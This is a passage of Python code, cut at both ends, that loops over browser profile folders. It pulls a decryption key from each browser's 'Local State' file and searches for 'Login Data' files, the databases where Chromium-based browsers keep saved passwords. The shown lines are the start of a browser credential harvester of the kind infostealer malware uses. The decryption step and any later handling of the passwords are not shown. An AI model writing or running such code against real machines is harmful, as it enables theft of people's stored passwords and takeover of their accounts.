]
for name, root in roots:
    ls = os.path.join(root, "Local State")
    if not os.path.exists(ls):
        print(name, "no LS"); continue
    try:
        key = get_key(ls)
    except Exception as e:
        print(name, "key", e); continue
    for dirpath, _, files in os.walk(root):
        if "Login Data" not in files or "Network" in dirpath:
            continue
        src = os.path.join(dirpath, "Login Data")
